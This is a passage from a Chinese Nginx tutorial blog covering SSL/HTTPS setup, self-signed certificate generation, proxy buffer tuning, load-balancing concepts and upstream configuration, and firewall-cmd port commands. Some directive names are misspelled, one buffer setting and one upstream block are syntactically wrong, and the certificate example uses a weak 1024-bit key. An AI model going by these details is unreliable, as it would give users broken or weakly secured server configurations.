alt="image-20230118185238480" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185232165.png" alt="image-20230118185232165" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185302983.png" alt="image-20230118185302983" /></p><p>​</p></li></ol><h2 id="nginx的安全控制"><a class="markdownIt-Anchor" href="#nginx的安全控制"></a> Nginx的安全控制</h2><p>关于web服务器的安全是比较大的一个话题，里面所涉及的内容很多，Nginx反向代理是如何来提升web服务器的安全呢？</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">安全隔离<br></code></pre></td></tr></table></figure><p>什么是安全隔离?</p><p>通过代理分开了客户端到应用程序服务器端的连接，实现了安全措施。在反向代理之前设置防火墙，仅留一个入口供代理服务器访问。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589908851340.png" alt="1589908851340" /></p><h3 id="如何使用ssl对流量进行加密"><a class="markdownIt-Anchor" href="#如何使用ssl对流量进行加密"></a> 如何使用SSL对流量进行加密</h3><p>翻译成大家能熟悉的说法就是将我们常用的http请求转变成https请求，那么这两个之间的区别简单的来说两个都是HTTP协议，只不过https是身披SSL外壳的http.</p><p>HTTPS是一种通过计算机网络进行安全通信的传输协议。它经由HTTP进行通信，利用SSL/TLS建立全通信，加密数据包，确保数据的安全性。</p><p>SSL(Secure Sockets Layer)安全套接层</p><p>TLS(Transport Layer Security)传输层安全</p><p>上述这两个是为网络通信提供安全及数据完整性的一种安全协议，TLS和SSL在传输层和应用层对网络连接进行加密。</p><p>总结来说为什么要使用https:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>协议是明文传输数据，存在安全问题，而<span class="hljs-keyword">https</span>是加密传输，相当于<span class="hljs-keyword">http</span>+ssl，并且可以防止流量劫持。<br></code></pre></td></tr></table></figure><p>Nginx要想使用SSL，需要满足一个条件即需要添加一个模块<code>--with-http_ssl_module</code>,而该模块在编译的过程中又需要OpenSSL的支持，这个我们之前已经准备好了。</p><h4 id="nginx添加ssl的支持"><a class="markdownIt-Anchor" href="#nginx添加ssl的支持"></a> nginx添加SSL的支持</h4><p>（1）完成 <code>--with-http_ssl_module</code>模块的增量添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">将原有/usr/local/nginx/sbin/nginx进行备份</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">拷贝nginx之前的配置信息</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">在nginx的安装源码进行配置指定对应模块  ./configure --with-http_ssl_module</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">通过make模板进行编译</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">将objs下面的nginx移动到/usr/local/nginx/sbin下</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">在源码目录下执行  make upgrade进行升级，这个可以实现不停机添加新模块的功能</span><br></code></pre></td></tr></table></figure><h4 id="nginx的ssl相关指令"><a class="markdownIt-Anchor" href="#nginx的ssl相关指令"></a> Nginx的SSL相关指令</h4><p>因为刚才我们介绍过该模块的指令都是通过ngx_http_ssl_module模块来解析的。</p><blockquote><p>ssl:该指令用来在指定的服务器开启HTTPS,可以使用 listen 443 ssl,后面这种方式更通用些。</p></blockquote><table><thead><tr><th>语法</th><th>ssl on | off;</th></tr></thead><tbody><tr><td>默认值</td><td>ssl off;</td></tr><tr><td>位置</td><td>http、server</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">443</span> ssl;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ssl_certificate:为当前这个虚拟主机指定一个带有PEM格式证书的证书。\</p></blockquote><table><thead><tr><th>语法</th><th>ssl_certificate file;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server</td></tr></tbody></table><blockquote><p>ssl_certificate_key:该指令用来指定PEM secret key文件的路径</p></blockquote><table><thead><tr><th>语法</th><th>ssl_ceritificate_key file;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server</td></tr></tbody></table><blockquote><p>ssl_session_cache:该指令用来配置用于SSL会话的缓存</p></blockquote><table><thead><tr><th>语法</th><th>ssl_sesion_cache off|none|[builtin[:size]] [shared:name:size]</th></tr></thead><tbody><tr><td>默认值</td><td>ssl_session_cache none;</td></tr><tr><td>位置</td><td>http、server</td></tr></tbody></table><p>off:禁用会话缓存，客户端不得重复使用会话</p><p>none:禁止使用会话缓存，客户端可以重复使用，但是并没有在缓存中存储会话参数</p><p>builtin:内置OpenSSL缓存，仅在一个工作进程中使用。</p><p>shared:所有工作进程之间共享缓存，缓存的相关信息用name和size来指定</p><blockquote><p>ssl_session_timeout：开启SSL会话功能后，设置客户端能够反复使用储存在缓存中的会话参数时间。</p></blockquote><table><thead><tr><th>语法</th><th>ssl_session_timeout time;</th></tr></thead><tbody><tr><td>默认值</td><td>ssl_session_timeout 5m;</td></tr><tr><td>位置</td><td>http、server</td></tr></tbody></table><blockquote><p>ssl_ciphers:指出允许的密码，密码指定为OpenSSL支持的格式</p></blockquote><table><thead><tr><th>语法</th><th>ssl_ciphers ciphers;</th></tr></thead><tbody><tr><td>默认值</td><td>ssl_ciphers HIGH:!aNULL:!MD5;</td></tr><tr><td>位置</td><td>http、server</td></tr></tbody></table><p>可以使用<code>openssl ciphers</code>查看openssl支持的格式。</p><blockquote><p>ssl_prefer_server_ciphers：该指令指定是否服务器密码优先客户端密码</p></blockquote><table><thead><tr><th>语法</th><th>ssl_perfer_server_ciphers on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>ssl_perfer_server_ciphers off;</td></tr><tr><td>位置</td><td>http、server</td></tr></tbody></table><h4 id="生成证书"><a class="markdownIt-Anchor" href="#生成证书"></a> 生成证书</h4><p>方式一：使用阿里云/腾讯云等第三方服务进行购买。</p><p>方式二:使用openssl生成证书</p><p>先要确认当前系统是否有安装openssl</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">openssl <span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><p>安装下面的命令进行生成</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mkdir /root/cert<br>cd /root/cert<br>openssl genrsa -des3 -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.key <span class="hljs-number">1024</span><br>openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.csr<br>cp <span class="hljs-keyword">server</span>.key <span class="hljs-keyword">server</span>.key.org<br>openssl rsa -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.key.org -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.key<br>openssl x509 -req -days <span class="hljs-number">365</span> -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.csr -signkey <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.crt<br></code></pre></td></tr></table></figure><h4 id="开启ssl实例"><a class="markdownIt-Anchor" href="#开启ssl实例"></a> 开启SSL实例</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>       <span class="hljs-number">443</span> ssl;<br>    <span class="hljs-attribute">server_name</span>  localhost;<br><br>    <span class="hljs-attribute">ssl_certificate</span>      server.cert;<br>    <span class="hljs-attribute">ssl_certificate_key</span>  server.key;<br><br>    <span class="hljs-attribute">ssl_session_cache</span>    shared:SSL:<span class="hljs-number">1m</span>;<br>    <span class="hljs-attribute">ssl_session_timeout</span>  <span class="hljs-number">5m</span>;<br><br>    <span class="hljs-attribute">ssl_ciphers</span>  HIGH:!aNULL:!MD5;<br>    <span class="hljs-attribute">ssl_prefer_server_ciphers</span>  <span class="hljs-literal">on</span>;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">root</span>   html;<br>        <span class="hljs-attribute">index</span>  index.html index.htm;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（4）验证</p><h2 id="反向代理系统调优"><a class="markdownIt-Anchor" href="#反向代理系统调优"></a> 反向代理系统调优</h2><p>反向代理值Buffer和Cache</p><p>Buffer翻译过来是&quot;缓冲&quot;，Cache翻译过来是&quot;缓存&quot;。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581879638569.png" alt="1581879638569" /></p><p>总结下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">相同点:</span><br>两种方式都是用来提供IO吞吐效率，都是用来提升Nginx代理的性能。<br><span class="hljs-section">不同点:</span><br>缓冲主要用来解决不同设备之间数据传递速度不一致导致的性能低的问题，缓冲中的数据一旦此次操作完成后，就可以删除。<br>缓存主要是备份，将被代理服务器的数据缓存一份到代理服务器，这样的话，客户端再次获取相同数据的时候，就只需要从代理服务器上获取，效率较高，缓存中的数据可以重复使用，只有满足特定条件才会删除.<br></code></pre></td></tr></table></figure><p>（1）Proxy Buffer相关指令</p><blockquote><p>proxy_buffering :该指令用来开启或者关闭代理服务器的缓冲区；</p></blockquote><table><thead><tr><th>语法</th><th>proxy_buffering on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_buffering on;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><blockquote><p>proxy_buffers:该指令用来指定单个连接从代理服务器读取响应的缓存区的个数和大小。</p></blockquote><table><thead><tr><th>语法</th><th>proxy_buffers number size;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_buffers 8 4k | 8K;(与系统平台有关)</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>number:缓冲区的个数</p><p>size:每个缓冲区的大小，缓冲区的总大小就是number*size</p><blockquote><p>proxy_buffer_size:该指令用来设置从被代理服务器获取的第一部分响应数据的大小。保持与proxy_buffers中的size一致即可，当然也可以更小。</p></blockquote><table><thead><tr><th>语法</th><th>proxy_buffer_size size;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_buffer_size 4k | 8k;(与系统平台有关)</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><blockquote><p>proxy_busy_buffers_size：该指令用来限制同时处于BUSY状态的缓冲总大小。</p></blockquote><table><thead><tr><th>语法</th><th>proxy_busy_buffers_size size;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_busy_buffers_size 8k|16K;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><blockquote><p>proxy_temp_path:当缓冲区存满后，仍未被Nginx服务器完全接受，响应数据就会被临时存放在磁盘文件上，该指令设置文件路径</p></blockquote><table><thead><tr><th>语法</th><th>proxy_temp_path  path;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_temp_path proxy_temp;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>注意path最多设置三层。</p><blockquote><p>proxy_temp_file_write_size：该指令用来设置磁盘上缓冲文件的大小。</p></blockquote><table><thead><tr><th>语法</th><th>proxy_temp_file_write_size size;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_temp_file_write_size 8K|16K;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>通用网站的配置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxy_buffering</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">proxy_buffer_size</span> <span class="hljs-number">4</span> <span class="hljs-number">32</span>k;<br><span class="hljs-attribute">proxy_busy_buffers_size</span> <span class="hljs-number">64</span>k;<br><span class="hljs-attribute">proxy_temp_file_write_size</span> <span class="hljs-number">64</span>k;<br></code></pre></td></tr></table></figure><p>根据项目的具体内容进行相应的调节。</p><h1 id="nginx负载均衡"><a class="markdownIt-Anchor" href="#nginx负载均衡"></a> Nginx负载均衡</h1><h2 id="负载均衡概述"><a class="markdownIt-Anchor" href="#负载均衡概述"></a> 负载均衡概述</h2><p>早期的网站流量和业务功能都比较简单，单台服务器足以满足基本的需求，但是随着互联网的发展，业务流量越来越大并且业务逻辑也跟着越来越复杂，单台服务器的性能及单点故障问题就凸显出来了，因此需要多台服务器进行性能的水平扩展及避免单点故障出现。那么如何将不同用户的请求流量分发到不同的服务器上呢？</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591631182469.png" alt="1591631182469" /></p><h2 id="负载均衡的原理及处理流程"><a class="markdownIt-Anchor" href="#负载均衡的原理及处理流程"></a> 负载均衡的原理及处理流程</h2><p>系统的扩展可以分为纵向扩展和横向扩展。</p><p>纵向扩展是从单机的角度出发，通过增加系统的硬件处理能力来提升服务器的处理能力</p><p>横向扩展是通过添加机器来满足大型网站服务的处理能力。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584602513812.png" alt="1584602513812" /></p><p>这里面涉及到两个重要的角色分别是&quot;应用集群&quot;和&quot;负载均衡器&quot;。</p><p>应用集群：将同一应用部署到多台机器上，组成处理集群，接收负载均衡设备分发的请求，进行处理并返回响应的数据。</p><p>负载均衡器:将用户访问的请求根据对应的负载均衡算法，分发到集群中的一台服务器进行处理。</p><h3 id="负载均衡的作用"><a class="markdownIt-Anchor" href="#负载均衡的作用"></a> 负载均衡的作用</h3><p>1、解决服务器的高并发压力，提高应用程序的处理性能。</p><p>2、提供故障转移，实现高可用。</p><p>3、通过添加或减少服务器数量，增强网站的可扩展性。</p><p>4、在负载均衡器上进行过滤，可以提高系统的安全性。</p><h2 id="负载均衡常用的处理方式"><a class="markdownIt-Anchor" href="#负载均衡常用的处理方式"></a> 负载均衡常用的处理方式</h2><h4 id="方式一用户手动选择"><a class="markdownIt-Anchor" href="#方式一用户手动选择"></a> 方式一:用户手动选择</h4><p>这种方式比较原始，只要实现的方式就是在网站主页上面提供不同线路、不同服务器链接方式，让用户来选择自己访问的具体服务器，来实现负载均衡。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584602887881.png" alt="1584602887881" /></p><h4 id="方式二dns轮询方式"><a class="markdownIt-Anchor" href="#方式二dns轮询方式"></a> 方式二:DNS轮询方式</h4><p>DNS</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">域名系统（服务）协议（DNS）是一种分布式网络目录服务，主要用于域名与 <span class="hljs-built_in">IP</span> 地址的相互转换。<br></code></pre></td></tr></table></figure><p>大多域名注册商都支持对同一个主机名添加多条A记录，这就是DNS轮询，DNS服务器将解析请求按照A记录的顺序，随机分配到不同的IP上，这样就能完成简单的负载均衡。DNS轮询的成本非常低，在一些不重要的服务器，被经常使用。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591010973996.png" alt="1591010973996" /></p><p>如下是我们为某一个域名添加的IP地址，用2台服务器来做负载均衡。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1590064506355.png" alt="1590064506355" /></p><p>验证:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">ping</span> www.nginx521.cn<br></code></pre></td></tr></table></figure><p>清空本地的dns缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig/flushdns<br></code></pre></td></tr></table></figure><p>我们发现使用DNS来实现轮询，不需要投入过多的成本，虽然DNS轮询成本低廉，但是DNS负载均衡存在明显的缺点。</p><p>1.可靠性低</p><p>假设一个域名DNS轮询多台服务器，如果其中的一台服务器发生故障，那么所有的访问该服务器的请求将不会有所回应，即使你将该服务器的IP从DNS中去掉，但是由于各大宽带接入商将众多的DNS存放在缓存中，以节省访问时间，导致DNS不会实时更新。所以DNS轮流上一定程度上解决了负载均衡问题，但是却存在可靠性不高的缺点。</p><p>2.负载均衡不均衡</p><p>DNS负载均衡采用的是简单的轮询负载算法，不能区分服务器的差异，不能反映服务器的当前运行状态，不能做到为性能好的服务器多分配请求，另外本地计算机也会缓存已经解析的域名到IP地址的映射，这也会导致使用该DNS服务器的用户在一定时间内访问的是同一台Web服务器，从而引发Web服务器减的负载不均衡。</p><p>负载不均衡则会导致某几台服务器负荷很低，而另外几台服务器负荷确很高，处理请求的速度慢，配置高的服务器分配到的请求少，而配置低的服务器分配到的请求多。</p><h4 id="方式三四七层负载均衡"><a class="markdownIt-Anchor" href="#方式三四七层负载均衡"></a> 方式三:四/七层负载均衡</h4><p>介绍四/七层负载均衡之前，我们先了解一个概念，OSI(open system interconnection),叫开放式系统互联模型，这个是由国际标准化组织ISO指定的一个不基于具体机型、操作系统或公司的网络体系结构。该模型将网络通信的工作分为七层。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584693830966.png" alt="1584693830966" /></p><p>应用层：为应用程序提供网络服务。</p><p>表示层：对数据进行格式化、编码、加密、压缩等操作。</p><p>会话层：建立、维护、管理会话连接。</p><p>传输层：建立、维护、管理端到端的连接，常见的有TCP/UDP。</p><p>网络层：IP寻址和路由选择</p><p>数据链路层：控制网络层与物理层之间的通信。</p><p>物理层：比特流传输。</p><p>所谓四层负载均衡指的是OSI七层模型中的传输层，主要是基于IP+PORT的负载均衡</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">实现四层负载均衡的方式：<br>硬件：<span class="hljs-built_in">F5</span> BIG-<span class="hljs-built_in">IP</span>、Radware等<br>软件：LVS、Nginx、Hayproxy等<br></code></pre></td></tr></table></figure><p>所谓的七层负载均衡指的是在应用层，主要是基于虚拟的URL或主机IP的负载均衡</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">实现七层负载均衡的方式：<br>软件：Nginx、Hayproxy等<br></code></pre></td></tr></table></figure><p>四层和七层负载均衡的区别</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">四层负载均衡数据包是在底层就进行了分发，而七层负载均衡数据包则在最顶端进行分发，所以四层负载均衡的效率比七层负载均衡的要高。<br>四层负载均衡不识别域名，而七层负载均衡识别域名。<br></code></pre></td></tr></table></figure><p>处理四层和七层负载以为其实还有二层、三层负载均衡，二层是在数据链路层基于mac地址来实现负载均衡，三层是在网络层一般采用虚拟IP地址的方式实现负载均衡。</p><p>实际环境采用的模式</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">四层负载<span class="hljs-comment">(LVS)</span>+七层负载<span class="hljs-comment">(Nginx)</span><br></code></pre></td></tr></table></figure><h3 id="nginx七层负载均衡"><a class="markdownIt-Anchor" href="#nginx七层负载均衡"></a> Nginx七层负载均衡</h3><p>Nginx要实现七层负载均衡需要用到proxy_pass代理模块配置。Nginx默认安装支持这个模块，我们不需要再做任何处理。Nginx的负载均衡是在Nginx的反向代理基础上把用户的请求根据指定的算法分发到一组【upstream虚拟服务池】。</p><h4 id="nginx七层负载均衡的指令"><a class="markdownIt-Anchor" href="#nginx七层负载均衡的指令"></a> Nginx七层负载均衡的指令</h4><h5 id="upstream指令"><a class="markdownIt-Anchor" href="#upstream指令"></a> upstream指令</h5><p>该指令是用来定义一组服务器，它们可以是监听不同端口的服务器，并且也可以是同时监听TCP和Unix socket的服务器。服务器可以指定不同的权重，默认为1。</p><table><thead><tr><th>语法</th><th>upstream name {…}</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http</td></tr></tbody></table><h5 id="server指令"><a class="markdownIt-Anchor" href="#server指令"></a> server指令</h5><p>该指令用来指定后端服务器的名称和一些参数，可以使用域名、IP、端口或者unix socket</p><table><thead><tr><th>语法</th><th>server name [paramerters]</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>upstream</td></tr></tbody></table><h4 id="nginx七层负载均衡的实现流程"><a class="markdownIt-Anchor" href="#nginx七层负载均衡的实现流程"></a> Nginx七层负载均衡的实现流程</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1590248160635.png" alt="1590248160635" /></p><p>服务端设置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>   <span class="hljs-number">9001</span>;<br>    <span class="hljs-attribute">server_name</span> linux.nginx;<br>    <span class="hljs-attribute">default_type</span> text/html;<br>    <span class="hljs-section">location</span> /&#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;linux.nginx:9001&lt;/h1&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>   <span class="hljs-number">9002</span>;<br>    <span class="hljs-attribute">server_name</span> linux.nginx;<br>    <span class="hljs-attribute">default_type</span> text/html;<br>    <span class="hljs-section">location</span> /&#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;linux.nginx:9002&lt;/h1&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>   <span class="hljs-number">9003</span>;<br>    <span class="hljs-attribute">server_name</span> linux.nginx;<br>    <span class="hljs-attribute">default_type</span> text/html;<br>    <span class="hljs-section">location</span> /&#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;linux.nginx:9003&lt;/h1&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>负载均衡器设置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br>    <span class="hljs-attribute">server</span> linux.nginx:<span class="hljs-number">9001</span>;<br>    <span class="hljs-attribute">server</span> linux.nginx:<span class="hljs-number">9002</span>;<br>    <span class="hljs-attribute">server</span> linux.nginx:<span class="hljs-number">9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br>    <span class="hljs-attribute">server_name</span> linux.nginx;<br>    <span class="hljs-section">location</span> /&#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://backend;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="负载均衡状态"><a class="markdownIt-Anchor" href="#负载均衡状态"></a> 负载均衡状态</h4><p>代理服务器在负责均衡调度中的状态有以下几个：</p><table><thead><tr><th>状态</th><th>概述</th></tr></thead><tbody><tr><td>down</td><td>当前的server暂时不参与负载均衡</td></tr><tr><td>backup</td><td>预留的备份服务器</td></tr><tr><td>max_fails</td><td>允许请求失败的次数</td></tr><tr><td>fail_timeout</td><td>经过max_fails失败后, 服务暂停时间</td></tr><tr><td>max_conns</td><td>限制最大的接收连接数</td></tr></tbody></table><h5 id="down"><a class="markdownIt-Anchor" href="#down"></a> down</h5><p>down:将该服务器标记为永久不可用，那么该代理服务器将不参与负载均衡。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> down;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span><br>server <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该状态一般会对需要停机维护的服务器进行设置。</p><h5 id="backup"><a class="markdownIt-Anchor" href="#backup"></a> backup</h5><p>backup:将该服务器标记为备份服务器，当主服务器不可用时，将用来传递请求。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> down;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span> backup;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时需要将9094端口的访问禁止掉来模拟下唯一能对外提供访问的服务宕机以后，backup的备份服务器就要开始对外提供服务，此时为了测试验证，我们需要使用防火墙来进行拦截。</p><p>介绍一个工具<code>firewall-cmd</code>,该工具是Linux提供的专门用来操作firewall的。</p><p>查询防火墙中指定的端口是否开放</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">firewall-<span class="hljs-keyword">cmd</span><span class="language-bash"> --query-port=9001/tcp</span><br></code></pre></td></tr></table></figure><p>如何开放一个指定的端口</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">permanent</span> <span class="hljs-literal">--</span><span class="hljs-comment">add</span><span class="hljs-literal">-</span><span class="hljs-comment">port=9002/tcp</span><br></code></pre></td></tr></table></figure><p>批量添加开发端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">firewall</span>-cmd --permanent --add-port=<span class="hljs-number">9001</span>-<span class="hljs-number">9003</span>/tcp<br></code></pre></td></tr></table></figure><p>如何移除一个指定的端口</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">permanent</span> <span 